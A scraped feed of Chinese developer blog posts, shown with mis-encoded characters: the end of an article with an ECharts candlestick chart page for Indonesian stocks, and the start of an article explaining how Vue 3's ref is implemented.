                    <span class="hljs-attr">borderColor</span>: <span class="hljs-string">'#2a4d7a'</span>,
                    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'rgba(16, 30, 44, 0.9)'</span>,
                    <span class="hljs-attr">textStyle</span>: {
                        <span class="hljs-attr">color</span>: <span class="hljs-string">'#e0e0e0'</span>
                    },
                    <span class="hljs-attr">formatter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">params</span>) {
                        <span class="hljs-keyword">const</span> data = params[<span class="hljs-number">0</span>].<span class="hljs-property">data</span>;
                        <span class="hljs-keyword">return</span> <span class="hljs-string">`
                            &lt;div&gt;æ—¶é—´: <span class="hljs-subst">${data[<span class="hljs-number">0</span>]}</span>&lt;/div&gt;
                            &lt;div&gt;å¼€ç›˜: <span class="hljs-subst">${data[<span class="hljs-number">1</span>]}</span>&lt;/div&gt;
                            &lt;div&gt;æ”¶ç›˜: <span class="hljs-subst">${data[<span class="hljs-number">2</span>]}</span>&lt;/div&gt;
                            &lt;div&gt;æœ€ä½: <span class="hljs-subst">${data[<span class="hljs-number">3</span>]}</span>&lt;/div&gt;
                            &lt;div&gt;æœ€é«˜: <span class="hljs-subst">${data[<span class="hljs-number">4</span>]}</span>&lt;/div&gt;
                            &lt;div&gt;æˆäº¤é‡: <span class="hljs-subst">${data[<span class="hljs-number">5</span>].toLocaleString()}</span>&lt;/div&gt;
                        `</span>;
                    }
                },
                <span class="hljs-attr">grid</span>: {
                    <span class="hljs-attr">top</span>: <span class="hljs-number">80</span>,
                    <span class="hljs-attr">left</span>: <span class="hljs-number">50</span>,
                    <span class="hljs-attr">right</span>: <span class="hljs-number">50</span>,
                    <span class="hljs-attr">bottom</span>: <span class="hljs-number">80</span>
                },
                <span class="hljs-attr">xAxis</span>: {
                    <span class="hljs-attr">type</span>: <span class="hljs-string">'category'</span>,
                    <span class="hljs-attr">data</span>: klineData.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item[<span class="hljs-number">0</span>]),
                    <span class="hljs-attr">scale</span>: <span class="hljs-literal">true</span>,
                    <span class="hljs-attr">boundaryGap</span>: <span class="hljs-literal">false</span>,
                    <span class="hljs-attr">axisLine</span>: {<span class="hljs-attr">onZero</span>: <span class="hljs-literal">false</span>},
                    <span class="hljs-attr">splitLine</span>: {<span class="hljs-attr">show</span>: <span class="hljs-literal">false</span>},
                    <span class="hljs-attr">splitNumber</span>: <span class="hljs-number">20</span>,
                    <span class="hljs-attr">axisLabel</span>: {
                        <span class="hljs-attr">color</span>: <span class="hljs-string">'#90a4ae'</span>,
                        <span class="hljs-attr">formatter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">value</span>) {
                            <span class="hljs-keyword">const</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(value);
                            <span class="hljs-keyword">if</span> (currentInterval === <span class="hljs-string">'1d'</span> || currentInterval === <span class="hljs-string">'1w'</span> || currentInterval === <span class="hljs-string">'1mo'</span>) {
                                <span class="hljs-keyword">return</span> echarts.<span class="hljs-property">format</span>.<span class="hljs-title function_">formatTime</span>(<span class="hljs-string">'MM-dd'</span>, date);
                            } <span class="hljs-keyword">else</span> {
                                <span class="hljs-keyword">return</span> echarts.<span class="hljs-property">format</span>.<span class="hljs-title function_">formatTime</span>(<span class="hljs-string">'HH:mm'</span>, date);
                            }
                        }
                    }
                },
                <span class="hljs-attr">yAxis</span>: {
                    <span class="hljs-attr">scale</span>: <span class="hljs-literal">true</span>,
                    <span class="hljs-attr">splitArea</span>: {
                        <span class="hljs-attr">show</span>: <span class="hljs-literal">true</span>,
                        <span class="hljs-attr">areaStyle</span>: {
                            <span class="hljs-attr">color</span>: [<span class="hljs-string">'rgba(255,255,255,0.02)'</span>, <span class="hljs-string">'rgba(0,0,0,0.02)'</span>]
                        }
                    },
                    <span class="hljs-attr">axisLabel</span>: {
                        <span class="hljs-attr">color</span>: <span class="hljs-string">'#90a4ae'</span>,
                        <span class="hljs-attr">formatter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">value</span>) {
                            <span class="hljs-keyword">return</span> value.<span class="hljs-title function_">toLocaleString</span>();
                        }
                    }
                },
                <span class="hljs-attr">dataZoom</span>: [
                    {
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'inside'</span>,
                        <span class="hljs-attr">start</span>: <span class="hljs-number">50</span>,
                        <span class="hljs-attr">end</span>: <span class="hljs-number">100</span>
                    },
                    {
                        <span class="hljs-attr">show</span>: <span class="hljs-literal">true</span>,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'slider'</span>,
                        <span class="hljs-attr">top</span>: <span class="hljs-string">'90%'</span>,
                        <span class="hljs-attr">height</span>: <span class="hljs-number">40</span>,
                        <span class="hljs-attr">borderColor</span>: <span class="hljs-string">'#1a2a3a'</span>,
                        <span class="hljs-attr">textStyle</span>: {
                            <span class="hljs-attr">color</span>: <span class="hljs-string">'#90a4ae'</span>
                        },
                        <span class="hljs-attr">handleStyle</span>: {
                            <span class="hljs-attr">color</span>: <span class="hljs-string">'#2a4d7a'</span>
                        }
                    }
                ],
                <span class="hljs-attr">series</span>: [
                    {
                        <span class="hljs-attr">name</span>: currentStock,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'candlestick'</span>,
                        <span class="hljs-attr">data</span>: klineData,
                        <span class="hljs-attr">itemStyle</span>: {
                            <span class="hljs-attr">color</span>: <span class="hljs-string">'#ef5350'</span>,
                            <span class="hljs-attr">color0</span>: <span class="hljs-string">'#26a69a'</span>,
                            <span class="hljs-attr">borderColor</span>: <span class="hljs-string">'#ef5350'</span>,
                            <span class="hljs-attr">borderColor0</span>: <span class="hljs-string">'#26a69a'</span>
                        },
                        <span class="hljs-attr">markPoint</span>: {
                            <span class="hljs-attr">label</span>: {
                                <span class="hljs-attr">formatter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">param</span>) {
                                    <span class="hljs-keyword">return</span> param != <span class="hljs-literal">null</span> ? <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(param.<span class="hljs-property">value</span>) : <span class="hljs-string">''</span>;
                                }
                            },
                            <span class="hljs-attr">data</span>: [
                                {
                                    <span class="hljs-attr">name</span>: <span class="hljs-string">'æœ€é«˜å€¼'</span>,
                                    <span class="hljs-attr">type</span>: <span class="hljs-string">'max'</span>,
                                    <span class="hljs-attr">valueDim</span>: <span class="hljs-string">'highest'</span>
                                },
                                {
                                    <span class="hljs-attr">name</span>: <span class="hljs-string">'æœ€ä½å€¼'</span>,
                                    <span class="hljs-attr">type</span>: <span class="hljs-string">'min'</span>,
                                    <span class="hljs-attr">valueDim</span>: <span class="hljs-string">'lowest'</span>
                                }
                            ]
                        }
                    },
                    {
                        <span class="hljs-attr">name</span>: <span class="hljs-string">'MA5'</span>,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'line'</span>,
                        <span class="hljs-attr">data</span>: ma5,
                        <span class="hljs-attr">smooth</span>: <span class="hljs-literal">true</span>,
                        <span class="hljs-attr">showSymbol</span>: <span class="hljs-literal">false</span>,
                        <span class="hljs-attr">lineStyle</span>: {
                            <span class="hljs-attr">width</span>: <span class="hljs-number">1</span>,
                            <span class="hljs-attr">color</span>: <span class="hljs-string">'#4fc3f7'</span>
                        }
                    },
                    {
                        <span class="hljs-attr">name</span>: <span class="hljs-string">'MA10'</span>,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'line'</span>,
                        <span class="hljs-attr">data</span>: ma10,
                        <span class="hljs-attr">smooth</span>: <span class="hljs-literal">true</span>,
                        <span class="hljs-attr">showSymbol</span>: <span class="hljs-literal">false</span>,
                        <span class="hljs-attr">lineStyle</span>: {
                            <span class="hljs-attr">width</span>: <span class="hljs-number">1</span>,
                            <span class="hljs-attr">color</span>: <span class="hljs-string">'#fdd835'</span>
                        }
                    },
                    {
                        <span class="hljs-attr">name</span>: <span class="hljs-string">'MA20'</span>,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'line'</span>,
                        <span class="hljs-attr">data</span>: ma20,
                        <span class="hljs-attr">smooth</span>: <span class="hljs-literal">true</span>,
                        <span class="hljs-attr">showSymbol</span>: <span class="hljs-literal">false</span>,
                        <span class="hljs-attr">lineStyle</span>: {
                            <span class="hljs-attr">width</span>: <span class="hljs-number">1</span>,
                            <span class="hljs-attr">color</span>: <span class="hljs-string">'#ab47bc'</span>
                        }
                    },
                    {
                        <span class="hljs-attr">name</span>: <span class="hljs-string">'æˆäº¤é‡'</span>,
                        <span class="hljs-attr">type</span>: <span class="hljs-string">'bar'</span>,
                        <span class="hljs-attr">xAxisIndex</span>: <span class="hljs-number">1</span>,
                        <span class="hljs-attr">yAxisIndex</span>: <span class="hljs-number">1</span>,
                        <span class="hljs-attr">data</span>: klineData.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item[<span class="hljs-number">5</span>]),
                        <span class="hljs-attr">itemStyle</span>: {
                            <span class="hljs-attr">color</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">params</span>) {
                                <span class="hljs-keyword">const</span> data = klineData[params.<span class="hljs-property">dataIndex</span>];
                                <span class="hljs-keyword">return</span> data[<span class="hljs-number">2</span>] &gt;= data[<span class="hljs-number">1</span>] ? <span class="hljs-string">'#26a69a'</span> : <span class="hljs-string">'#ef5350'</span>;
                            }
                        }
                    }
                ]
            };
            
            <span class="hljs-comment">// è®¾ç½®å›¾è¡¨é€‰é¡¹</span>
            myChart.<span class="hljs-title function_">setOption</span>(option);
        }
        
        <span class="hljs-comment">// åˆå§‹åŒ–äº‹ä»¶ç›‘å¬</span>
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">initEventListeners</span>(<span class="hljs-params"/>) {
            <span class="hljs-comment">// æ—¶é—´æ¡†æ¶åˆ‡æ¢</span>
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.interval-btn'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">btn</span> =&gt;</span> {
                btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.interval-btn'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'active'</span>));
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'active'</span>);
                    currentInterval = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-interval'</span>);
                    <span class="hljs-title function_">updateChart</span>();
                });
            });
            
            <span class="hljs-comment">// è‚¡ç¥¨é€‰æ‹©</span>
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'stockSelect'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'change'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
                currentStock = <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;
                <span class="hljs-title function_">updateChart</span>();
            });
            
            <span class="hljs-comment">// æŠ€æœ¯æŒ‡æ ‡åˆ‡æ¢</span>
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.indicator-btn'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">btn</span> =&gt;</span> {
                btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
                    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.indicator-btn'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">b</span> =&gt;</span> b.<span class="hljs-property">classList</span>.<span class="hljs-title function_">remove</span>(<span class="hljs-string">'active'</span>));
                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">'active'</span>);
                    currentIndicator = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-indicator'</span>);
                    <span class="hljs-comment">// è¿™é‡Œå¯ä»¥æ·»åŠ åˆ‡æ¢æŠ€æœ¯æŒ‡æ ‡çš„é€»è¾‘</span>
                });
            });
            
            <span class="hljs-comment">// çª—å£å¤§å°å˜åŒ–æ—¶è°ƒæ•´å›¾è¡¨å¤§å°</span>
            <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
                myChart.<span class="hljs-title function_">resize</span>();
            });
        }
        
        <span class="hljs-comment">// é¡µé¢åŠ è½½å®Œæˆååˆå§‹åŒ–</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'DOMContentLoaded'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
            <span class="hljs-title function_">initEventListeners</span>();
            <span class="hljs-title function_">updateChart</span>();
        });
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 data-id="heading-2">åŠŸèƒ½è¯´æ˜</h3>
<p>è¿™ä¸ªHTMLé¡µé¢æä¾›äº†ä»¥ä¸‹åŠŸèƒ½ï¼š</p>
<ol>
<li><strong>å¤šæ—¶é—´æ¡†æ¶åˆ‡æ¢</strong>ï¼šæ”¯æŒ1åˆ†é’Ÿã€5åˆ†é’Ÿã€15åˆ†é’Ÿã€30åˆ†é’Ÿã€1å°æ—¶ã€æ—¥çº¿ã€å‘¨çº¿å’Œæœˆçº¿è§†å›¾</li>
<li><strong>è‚¡ç¥¨é€‰æ‹©</strong>ï¼šå¯ä»¥æŸ¥çœ‹é›…åŠ è¾¾ç»¼åˆæŒ‡æ•°(JCI)å’Œå°å°¼ä¸»è¦è‚¡ç¥¨ï¼ˆå¦‚BBCAã€BBRIç­‰ï¼‰</li>
<li><strong>æŠ€æœ¯æŒ‡æ ‡</strong>ï¼šåŒ…å«MAï¼ˆç§»åŠ¨å¹³å‡çº¿ï¼‰ç­‰å¸¸ç”¨æŠ€æœ¯æŒ‡æ ‡</li>
<li><strong>å®æ—¶æ•°æ®å±•ç¤º</strong>ï¼šæ˜¾ç¤ºå½“å‰ä»·æ ¼ã€æ¶¨è·Œå¹…ã€å¼€ç›˜ä»·ã€æœ€é«˜ä»·å’Œæœ€ä½ä»·</li>
<li><strong>äº¤äº’åŠŸèƒ½</strong>ï¼šæ”¯æŒå›¾è¡¨ç¼©æ”¾ã€å¹³ç§»ç­‰æ“ä½œ</li>
</ol>
<h3 data-id="heading-3">æŠ€æœ¯å®ç°</h3>
<p>é¡µé¢ä½¿ç”¨EChartsåº“ç»˜åˆ¶Kçº¿å›¾ï¼Œè¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„æ•°æ®å¯è§†åŒ–åº“ã€‚é€šè¿‡JavaScriptç”Ÿæˆæ¨¡æ‹Ÿçš„Kçº¿æ•°æ®ï¼ˆå®é™…åº”ç”¨ä¸­åº”æ›¿æ¢ä¸ºçœŸå®çš„APIè°ƒç”¨ï¼‰ã€‚ é¡µé¢è®¾è®¡é‡‡ç”¨æš—è‰²ä¸»é¢˜ï¼Œç¬¦åˆé‡‘èæ•°æ®å±•ç¤ºçš„å¸¸è§é£æ ¼ï¼Œç¡®ä¿æ•°æ®å¯è§†æ€§å¹¶å‡å°‘è§†è§‰ç–²åŠ³ã€‚</p>
<h3 data-id="heading-4">å¦‚ä½•ä½¿ç”¨</h3>
<ol>
<li>å°†ä¸Šè¿°ä»£ç ä¿å­˜ä¸ºHTMLæ–‡ä»¶</li>
<li>åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€è¯¥æ–‡ä»¶</li>
<li>ä½¿ç”¨å·¦ä¾§é¢æ¿åˆ‡æ¢ä¸åŒçš„æ—¶é—´æ¡†æ¶å’Œè‚¡ç¥¨</li>
<li>é€šè¿‡å›¾è¡¨ä¸‹æ–¹çš„æ»‘å—ç¼©æ”¾å’Œå¹³ç§»Kçº¿å›¾</li>
</ol>
<p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œæ‚¨éœ€è¦å°†æ¨¡æ‹Ÿæ•°æ®ç”Ÿæˆéƒ¨åˆ†æ›¿æ¢ä¸ºçœŸå®çš„APIè°ƒç”¨ï¼Œä¾‹å¦‚ä½¿ç”¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fpao.stocktv.top%2F" target="_blank" title="https://pao.stocktv.top/" ref="nofollow noopener noreferrer">StockTV</a>ç­‰é‡‘èæ•°æ®æœåŠ¡å•†æä¾›çš„æ¥å£ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vueå“åº”å¼åŸç†(13)-refå®ç°åŸç†è§£æ]]></title>    <link>https://juejin.cn/post/7577171133444227108</link>    <guid>https://juejin.cn/post/7577171133444227108</guid>    <pubDate>2025-11-27T06:17:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577171133444227108" data-draft-id="7576935292428861482" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vueå“åº”å¼åŸç†(13)-refå®ç°åŸç†è§£æ"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js"/> <meta itemprop="datePublished" content="2025-11-27T06:17:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜æ•™æ•™ä¸»å¼ 5G"/> <meta itemprop="url" content="https://juejin.cn/user/644766058425008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vueå“åº”å¼åŸç†(13)-refå®ç°åŸç†è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/644766058425008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜æ•™æ•™ä¸»å¼ 5G
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:17:44.000Z" title="Thu Nov 27 2025 06:17:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue 3 ä¸­ Ref å®ç°åŸç†è§£æ</h2>
<p>åœ¨ Vue 3 ä¸­ï¼Œ<code>ref</code> æ˜¯ç»„åˆå¼ APIï¼ˆComposition APIï¼‰çš„æ ¸å¿ƒã€‚å¾ˆå¤šå¼€å‘è€…è™½ç„¶ä¼šç”¨ï¼Œä½†å¯¹å…¶å†…éƒ¨è¿ä½œæœºåˆ¶ã€<code>ref</code> ä¸ <code>reactive</code> çš„å…³ç³»ã€ä»¥åŠä¸ºä»€ä¹ˆåœ¨scritä¸­æˆ‘ä»¬è®¿é—® <code>ref</code> æ•°æ®éœ€è¦ç”¨ <code>.value</code>, ä½†æ˜¯åœ¨æ¨¡æ¿é‡Œä¸éœ€è¦ <code>.value</code> å¾€å¾€ä¸€çŸ¥åŠè§£ã€‚</p>
<p>æœ¬æ–‡å°†å‰¥ç¦»å¤æ‚çš„è¾¹ç•Œæƒ…å†µï¼Œç”¨æœ€ç²¾ç®€çš„ä»£ç è¿˜åŸ Vue 3 æºç çš„æ ¸å¿ƒé€»è¾‘ï¼Œå¸¦ä½ å½»åº•ææ‡‚è¿™ä¸‰ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li><strong><code>ref</code> æ˜¯å¦‚ä½•å®ç°çš„ï¼Ÿ</strong></li>
<li><strong><code>toRefs</code> æ˜¯å¦‚ä½•è§£å†³è§£æ„ä¸¢å¤±å“åº”æ€§é—®é¢˜çš„ï¼Ÿ</strong></li>
<li><strong>ä¸ºä»€ä¹ˆåœ¨æ¨¡æ¿ä¸­ä¸éœ€è¦ <code>.value</code>ï¼Ÿ</strong></li>
</ol>
<hr/>
<h3 data-id="heading-1">1. Ref çš„åŸç†è§£æ</h3>
<h4 data-id="heading-2">ä¸ºä»€ä¹ˆéœ€è¦ Refï¼Ÿ</h4>
<p>åœ¨å…ˆå‰çš„éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬å¯¹å“åº”å¼æ•°æ®çš„åŸç†è¿›è¡Œäº†ä»‹ç»ï¼Œæˆ‘ä»¬é€šè¿‡ <code>reactive</code> å‡½æ•°å¤„ç†ä¸€ä¸ªå¯¹è±¡æ¥ä½¿å…¶è½¬å˜ä¸ºå“åº”å¼æ•°æ®ï¼Œè€Œå¯¹äº JavaScript ä¸­çš„åŸå§‹ç±»å‹ï¼ˆString, Number, Boolean, ...ï¼‰æ˜¯<strong>å€¼ä¼ é€’</strong>çš„ã€‚å¦‚æœä½ æŠŠä¸€ä¸ªæ•°å­—ä¼ ç»™ä¸€ä¸ªå‡½æ•°ï¼Œå‡½æ•°æ— æ³•è¿½è¸ªè¿™ä¸ªæ•°å­—çš„å˜åŒ–ã€‚ä¸ºäº†è®©åŸå§‹å€¼å˜æˆâ€œå“åº”å¼â€ï¼Œæˆ‘ä»¬éœ€è¦æŠŠå®ƒåŒ…è£¹åœ¨ä¸€ä¸ªå¯¹è±¡ä¸­ï¼ˆWrapper Patternï¼‰ï¼Œåˆ©ç”¨å¯¹è±¡çš„ <code>getter</code> å’Œ <code>setter</code> æ¥æ‹¦æˆªè®¿é—®å’Œä¿®æ”¹ã€‚</p>
<h4 data-id="heading-3">æ ¸å¿ƒå®ç°ï¼š<code>RefImpl</code> ç±»</h4>
<p>Vue 3 å†…éƒ¨é€šè¿‡ <code>RefImpl</code> ç±»æ¥å®ç° <code>ref</code>ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä¼ªä»£ç ï¼šç®€åŒ–ç‰ˆçš„ RefImpl</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">RefImpl</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">_value</span>: <span class="hljs-built_in">any</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">_rawValue</span>: <span class="hljs-built_in">any</span>;
  <span class="hljs-keyword">public</span> <span class="hljs-attr">dep</span>: <span class="hljs-title class_">Dep</span>; <span class="hljs-comment">// ä¾èµ–å®¹å™¨</span>
  <span class="hljs-keyword">public</span> __v_isRef = <span class="hljs-literal">true</span>; <span class="hljs-comment">// æ ‡è®°è¿™æ˜¯ä¸€ä¸ª ref å¯¹è±¡</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">value</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_rawValue</span> = value;
    <span class="hljs-comment">// å¦‚æœä¼ å…¥çš„æ˜¯å¯¹è±¡ï¼Œåˆ™é€šè¿‡ reactive è½¬æ¢ï¼Œå¦åˆ™ä¿æŒåŸå€¼</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span> = <span class="hljs-title function_">isObject</span>(value) ? <span class="hljs-title function_">reactive</span>(value) : value;
